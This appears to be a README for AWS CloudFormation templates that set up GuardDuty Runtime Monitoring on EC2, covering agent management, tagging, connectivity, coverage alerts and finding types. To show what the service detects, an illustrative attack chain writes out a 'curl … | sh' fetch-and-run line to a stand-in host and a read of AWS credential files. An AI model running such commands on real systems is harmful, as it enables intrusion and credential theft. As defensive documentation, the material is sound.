
## GuardDuty Runtime Monitoring for EC2

| Template | What it does |
|---|---|
| [guardduty-runtime-monitoring-ec2.yaml](guardduty-runtime-monitoring-ec2.yaml) | Detector with `RUNTIME_MONITORING` + `EC2_AGENT_MANAGEMENT`, runtime finding email, coverage-status email |
| [guardduty-runtime-monitoring-ec2-instance.yaml](guardduty-runtime-monitoring-ec2-instance.yaml) | An agent-ready instance and an opted-out instance: SSM role, IMDS tags, `GuardDutyManaged` tag |
| [guardduty-runtime-monitoring-vpc-endpoint.yaml](guardduty-runtime-monitoring-vpc-endpoint.yaml) | The `guardduty-data` endpoint owned by your stack, so your VPC stack can still be deleted |

### The problem

Classic GuardDuty reads **logs about** your workload from the outside: CloudTrail management events, VPC flow logs, Route 53 DNS query logs, S3 data events. That catches an attacker *using* the AWS API or talking to a known-bad IP. It cannot see anything that happens **inside** the instance.

So this is invisible to flow logs and CloudTrail:

```
 web app RCE -> /bin/sh spawned from httpd -> curl miner.example/x.sh | sh
              -> reads /root/.aws/credentials
              -> ptrace into another process to hide
```

Runtime Monitoring puts a **security agent** on the instance that uses eBPF to report process execution with command-line arguments and process lineage, file access, network connections and DNS. GuardDuty analyses that stream and produces finding types with `:Runtime/` in them. Announced GA for EC2 on **2024-03-29**; EKS and ECS-on-Fargate coverage came earlier under the same Runtime Monitoring feature.

| Source | Sees |
|---|---|
| CloudTrail management events | API calls (`RunInstances`, `CreateUser`) |
| VPC flow logs | Connections, with no idea which process made them |
| DNS query logs | Lookups, with no idea which process made them |
| **Runtime Monitoring** | **The process, its arguments, its parent chain, the files it touched, the connection it opened** |

Offline docs: [../../docs/guardduty/README.md](../../docs/guardduty/README.md)

----------------------------------------------------------------------------------

## Enabling it is two steps

This trips people up: turning the feature on does **not** monitor anything by itself.

| Step | What | In CloudFormation |
|---|---|---|
| 1. Turn on the feature | GuardDuty will now accept runtime events from the account | `Features: [{Name: RUNTIME_MONITORING, Status: ENABLED}]` |
| 2. Get the agent onto hosts | Automated (GuardDuty installs and updates it over SSM) or manual (you install the RPM or run an SSM document) | `AdditionalConfiguration: [{Name: EC2_AGENT_MANAGEMENT, Status: ENABLED}]` |

```yaml
Features:
  - Name: RUNTIME_MONITORING
    Status: ENABLED
    AdditionalConfiguration:
      - Name: EC2_AGENT_MANAGEMENT
        Status: ENABLED
```

The three agent-management switches are independent, so you can run automated agents on EC2 and manage EKS yourself:

| `AdditionalConfiguration` name | Resource type |
|---|---|
| `EC2_AGENT_MANAGEMENT` | EC2 instances (and ECS tasks on EC2) |
| `ECS_FARGATE_AGENT_MANAGEMENT` | ECS on Fargate (sidecar; there is no manual option) |
| `EKS_ADDON_MANAGEMENT` | EKS (the `aws-guardduty-agent` add-on) |

**Never enable `EKS_RUNTIME_MONITORING` as well.** It is the older standalone feature, `RUNTIME_MONITORING` already covers EKS, and requesting both returns an error. If you enabled the old one first, disable it or you keep paying for it.

### Two CloudFormation limits worth knowing before you deploy

- **One detector per account per Region.** `AWS::GuardDuty::Detector` creates it, so if GuardDuty is already on, the stack fails with *detector already exists for the current account*. Import the existing detector into the stack, or configure it with `aws guardduty update-detector` and skip this resource.
- **`Features` or `DataSources`, never both** in one detector. `DataSources` is the older style; `Features` replaces it.
- There is **no GuardDuty organization-configuration resource** in CloudFormation. Auto-enabling Runtime Monitoring for new member accounts is an API step from the delegated administrator:

  ```bash
  aws guardduty update-organization-configuration --detector-id <id> --auto-enable-organization-members ALL \
    --features '[{"Name":"RUNTIME_MONITORING","AutoEnable":"ALL",
                  "AdditionalConfiguration":[{"Name":"EC2_AGENT_MANAGEMENT","AutoEnable":"ALL"}]}]'
  ```

----------------------------------------------------------------------------------

## Who gets the agent: the `GuardDutyManaged` tag

With automated agent management, GuardDuty creates **one SSM association**, `GuardDutyRuntimeMonitoring-do-not-delete`, and installs the agent through it. Scope is controlled by one tag, and which direction it works depends on the setting:

| `EC2_AGENT_MANAGEMENT` | Instances that get the agent | Tag role |
|---|---|---|
| `ENABLED` | **All** instances in the account | `GuardDutyManaged=false` **excludes** one (opt-out) |
| `DISABLED` | **Only** tagged instances | `GuardDutyManaged=true` **includes** one (opt-in) |

Three things that bite:

- **Exclusion tags are read from IMDS**, not from the EC2 API. The instance must have **instance metadata tags enabled** (`MetadataOptions.InstanceMetadataTags: enabled`), or GuardDuty cannot see `GuardDutyManaged=false` and installs the agent anyway.
- **Tag before launch.** Once automated agent management is on, any instance that launches without the exclusion tag is covered. Adding the tag later stops GuardDuty *managing* the agent but does **not** uninstall it — you keep being billed until you remove it.
- **Protect the tag.** Anyone who can tag an instance can switch off its runtime detection. Deny `ec2:CreateTags` on the `GuardDutyManaged` key with an SCP or IAM policy.

### Instance prerequisites

| Requirement | Detail |
|---|---|
| SSM managed | Only for automated agent management; the instance must appear in Fleet Manager |
| CPU | AMD64, or ARM64 on **Graviton2 and later**. First-generation Graviton (A1) is not supported |
| OS / kernel | A verified list (AL2/AL2023, Ubuntu, Debian, RHEL, Rocky, Alma, SUSE, Bottlerocket). Kernel needs `CONFIG_DEBUG_INFO_BTF=y` |
| `RLIMIT_MEMLOCK` | On kernel 5.10 and older, at least 32 MB hard and soft |
| Permissions | The agent authenticates with the **EC2 instance identity role** — nothing to add to your instance profile |
| SCP | Must allow `guardduty:SendSecurityTelemetry` |

The agent is capped so it cannot eat the workload: **10% of total vCPU**, and memory by instance size — 128 MB below 8 GB RAM, 256 MB from 8 GB to under 32 GB, 1 GB at 32 GB and above.

----------------------------------------------------------------------------------

## How the agent reaches GuardDuty, and the IaC trap

Two connectivity paths, both inside the AWS network, neither charged:

| Path | Address | When |
|---|---|---|
| Link-local | `169.254.170.248/29`, `fd00:ec2:6d00::/64` | Default for **new** automated-agent enablements, in Regions that support it |
| VPC endpoint | `com.amazonaws.<region>.guardduty-data`, private DNS `guardduty-data.<region>.amazonaws.com` | Manual agent management, Regions without link-local, and existing setups |

On the link-local path an endpoint policy or the endpoint's security group does not apply. But if you filter egress **on the host or its security group**, you must allow 443 to those link-local ranges or coverage silently goes Unhealthy.

### The trap

When GuardDuty creates the endpoint itself, it puts it in your subnets and tags it `GuardDutyManaged=true`, and only deletes it when you **disable Runtime Monitoring**. CloudFormation knows nothing about it, so deleting your VPC stack fails:

```
The subnet 'subnet-0abc...' has dependencies and cannot be deleted. (DependencyViolation)
```

The fix is ownership, in this order:

1. Deploy [guardduty-runtime-monitoring-vpc-endpoint.yaml](guardduty-runtime-monitoring-vpc-endpoint.yaml) — your stack creates the endpoint and its security group.
2. *Then* enable automated agent management. GuardDuty finds an endpoint already there and **reuses it** instead of creating its own.

Deliberately **do not** tag your endpoint `GuardDutyManaged=true`: that tag is how GuardDuty marks the resources it considers its own and deletes.

A VPC that GuardDuty has already set up keeps using GuardDuty's endpoint until you turn Runtime Monitoring off and on again.

----------------------------------------------------------------------------------

## Coverage is the thing to alert on

A finding only exists if the agent is reporting. Coverage status is **Healthy** or **Unhealthy** per instance, and Unhealthy fails silently — no agent, no events, no findings, no error anywhere you'd notice.

```bash
aws guardduty get-coverage-statistics --detector-id <id> --statistics-type COUNT_BY_COVERAGE_STATUS
aws guardduty list-coverage --detector-id <id> \
  --filter-criteria '{"FilterCriterion":[{"CriterionKey":"COVERAGE_STATUS","FilterCondition":{"EqualsValue":"UNHEALTHY"}}]}'
```

GuardDuty also publishes status transitions to EventBridge, which is what `RuntimeCoverageRule` subscribes to:

| `detail-type` | Meaning |
|---|---|
| `GuardDuty Runtime Protection Unhealthy` | Healthy -> Unhealthy |
| `GuardDuty Runtime Protection Healthy` | Unhealthy -> Healthy |

The event carries `detail.issue`, `detail.resourceDetails.ec2InstanceDetails.instanceId`, the agent version and `managementType`.

### Common `issue` values

| Issue | Cause |
|---|---|
| Waiting for SSM notification | Normal for a few minutes after launch |
| Agent disconnected | Check `/var/log/amzn-guardduty-agent/` and `sudo journalctl -u amazon-guardduty-agent` |
| Instances with exclusion tags are excluded | `GuardDutyManaged=false` is set |
| Kernel version is lower/higher than supported | Unverified kernel |
| Unable to retrieve instance identity document | IMDS disabled, or the identity document is missing — stop/start the instance |
| GuardDuty SSM association already exists | Delete it, then disable and re-enable automated agent management |
| Your account has too many SSM associations | Delete unused associations or raise the quota |

----------------------------------------------------------------------------------

## Findings

Every Runtime Monitoring finding type contains `:Runtime/`, which is what makes a single EventBridge wildcard rule possible:

```yaml
detail:
  type:
    - wildcard: "*:Runtime/*"
```

A sample of what it catches, by what the agent alone can see:

| Finding type | Detected because |
|---|---|
| `Execution:Runtime/ReverseShell` | A shell with its stdio wired to a socket |
| `Execution:Runtime/SuspiciousShellCreated` | A shell spawned by a web server process |
| `Impact:Runtime/CryptoMinerExecuted` | Miner binary executed |
| `CredentialAccess:Runtime/SensitiveFileRead` | Something read `/root/.aws/credentials`, `/etc/shadow` |
| `PrivilegeEscalation:Runtime/RuncContainerEscape` | Container escape via runc |
| `PrivilegeEscalation:Runtime/DockerSocketAccessed` | A process touched the Docker socket |
| `DefenseEvasion:Runtime/FilelessExecution` | Code executed from memory, never written to disk |
| `DefenseEvasion:Runtime/ProcessInjection.Ptrace` | ptrace injection into another process |
| `UnauthorizedAccess:Runtime/MetadataDNSRebind` | DNS rebinding aimed at IMDS |
| `Trojan:Runtime/DropPoint` | Connection to a known exfiltration host |

Severity bands: **Low** 1.0-3.9, **Medium** 4.0-6.9, **High** 7.0-8.9, **Critical** 9.0-10.0. `RuntimeFindingRule` notifies on Medium and up.

The threshold is a **literal `4`** in the template rather than a parameter, because EventBridge numeric matching needs a JSON number and a `Ref` to a `Number` parameter may render as a string. Edit the number to change it.

Runtime findings carry `service.runtimeDetails` — `process.name`, `process.executablePath`, `process.executableSha256`, `process.lineage` and context such as the file path that was read. That is the part worth sending to your SIEM.

----------------------------------------------------------------------------------

## Cost

Runtime Monitoring is billed per **vCPU-hour of monitored resources**, so it scales with fleet size, not with event volume. Two things soften it:

- While an instance's agent is reporting, GuardDuty **stops charging VPC flow log analysis for that instance**, so the two features don't double-bill.
- 30-day free trial per account and Region.

If you disable automated agent management but leave the agent installed, it keeps sending events and you keep paying. Remove the agent from the host as well.

----------------------------------------------------------------------------------

## Deploy

```bash
# 1. Only if you need a customer-owned endpoint (manual agents, no link-local, or IaC deletability)
aws cloudformation create-stack --stack-name myapp-dev-guardduty-endpoint \
  --template-body file://guardduty-runtime-monitoring-vpc-endpoint.yaml \
  --parameters ParameterKey=VpcId,ParameterValue=vpc-0abc ParameterKey=VpcCidrBlock,ParameterValue=10.0.0.0/16 \
               ParameterKey=VpcSubnetIdList,ParameterValue=\"subnet-0abc,subnet-0def\"

# 2. Detector + notifications
aws cloudformation create-stack --stack-name myapp-dev-guardduty-runtime \
  --template-body file://guardduty-runtime-monitoring-ec2.yaml \
  --parameters ParameterKey=NotificationEmail,ParameterValue=security@example.com
# confirm the SNS subscription email

# 3. An instance to prove coverage
aws cloudformation create-stack --stack-name myapp-dev-guardduty-instance \
  --template-body file://guardduty-runtime-monitoring-ec2-instance.yaml --capabilities CAPABILITY_IAM \
  --parameters ParameterKey=VpcId,ParameterValue=vpc-0abc ParameterKey=VpcSubnetId,ParameterValue=subnet-0abc
```

Then check that the agent arrived:

```bash
DETECTOR=$(aws guardduty list-detectors --query 'DetectorIds[0]' --output text)
aws guardduty list-coverage --detector-id $DETECTOR \
  --query 'Resources[].{Id:ResourceDetails.Ec2InstanceDetails.InstanceId,Status:CoverageStatus,Issue:Issue}'

# on the instance, via Session Manager
sudo systemctl status amazon-guardduty-agent
```

Expected: `MonitoredInstance` becomes `HEALTHY` within a few minutes, `OptedOutInstance` stays uncovered with the exclusion-tag issue.

To generate a real finding, use the GuardDuty **sample findings** generator (`aws guardduty create-sample-findings --detector-id $DETECTOR --finding-types Execution:Runtime/ReverseShell`) — it exercises the EventBridge rule and the email path without doing anything to the instance.

**Not verified:** the templates parse as YAML but `cloudformation:ValidateTemplate` and `events:TestEventPattern` were both denied for this IAM user, so the event patterns have not been checked against the API, and nothing was deployed.

## Docs

- [../../docs/guardduty/ug-runtime-monitoring-enablement.md](../../docs/guardduty/ug-runtime-monitoring-enablement.md) (two-step enablement, flow log billing waiver)
- [../../docs/guardduty/ug-how-runtime-monitoring-works-ec2.md](../../docs/guardduty/ug-how-runtime-monitoring-works-ec2.md) (automated vs manual, tag behaviour)
- [../../docs/guardduty/ug-prereq-runtime-monitoring-ec2-support.md](../../docs/guardduty/ug-prereq-runtime-monitoring-ec2-support.md) (SSM, IMDS tags, CPU/memory limits, SCP)
- [../../docs/guardduty/ug-runtime-monitoring-agent-connectivity.md](../../docs/guardduty/ug-runtime-monitoring-agent-connectivity.md) (link-local vs VPC endpoint)
- [../../docs/guardduty/ug-using-iac-with-gdu-automated-agents.md](../../docs/guardduty/ug-using-iac-with-gdu-automated-agents.md) (the `DependencyViolation` trap and the fix)
- [../../docs/guardduty/ug-gdu-assess-coverage-ec2.md](../../docs/guardduty/ug-gdu-assess-coverage-ec2.md) (coverage troubleshooting, coverage EventBridge events)
- [../../docs/guardduty/ug-findings-runtime-monitoring.md](../../docs/guardduty/ug-findings-runtime-monitoring.md) (all finding types)
- [../../docs/guardduty/api-DetectorAdditionalConfiguration.md](../../docs/guardduty/api-DetectorAdditionalConfiguration.md) (the three agent-management names)
